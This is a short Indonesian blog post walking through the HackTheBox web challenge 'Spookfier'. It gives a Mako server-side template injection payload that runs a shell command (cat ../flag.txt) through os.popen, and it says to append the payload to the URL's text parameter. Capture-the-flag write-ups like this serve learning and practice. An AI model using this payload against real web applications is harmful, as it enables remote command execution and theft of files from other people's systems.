---
title: "HackTheBox - Spookfier"
date: 2023-12-29 18:34:00 +0700
categories: [HackTheBox, Challenges]
tags: [very easy, web]
---

**Spookfier** ialah salah satu tantangan kategori web dari situs HackTheBox, Gunship ini sebenarnya tantangan lama tapi karena saya belum coba, jadi saya kerjakan aja. Ini perjalanan/panduan saya. Oh iya, disini kita akan mempelajari tentang exploit, SSTI, dll.

## Introduction

- Munculkan mesin, hahaha....
- Dan download file-nya

## Enumeration

Pokoknya exploitnya [SSTI Mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

```bash
${self.module.runtime.util.os.popen("cat ../flag.txt").read()}
```

> tambahkan di belakang urlnya, habis text=
{: .prompt-info}